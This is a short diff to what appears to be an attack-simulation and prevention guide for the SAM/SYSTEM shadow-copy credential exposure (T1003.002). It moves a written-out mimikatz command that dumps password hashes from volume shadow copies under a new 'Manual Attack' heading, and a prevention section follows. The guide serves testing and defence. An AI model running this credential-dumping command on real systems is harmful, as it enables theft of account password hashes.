@@ -24,7 +24,8 @@ A vulnerable system will report ```BUILTIN\Users:(I)(RX)```
 2. Select the Compound Action for T1003.002
 Note: you may need to change the HarddiskVolumeShadowCopy#
 
-```mimikatz "lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\system /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\\sam"```
+## Manual Attack
+- ```mimikatz "lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\system /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\\sam"```
 
 ## Prevention
 Restrict access to sam, system, and security files and remove VSS shadow copies. On a command prompt with administrative privileges:
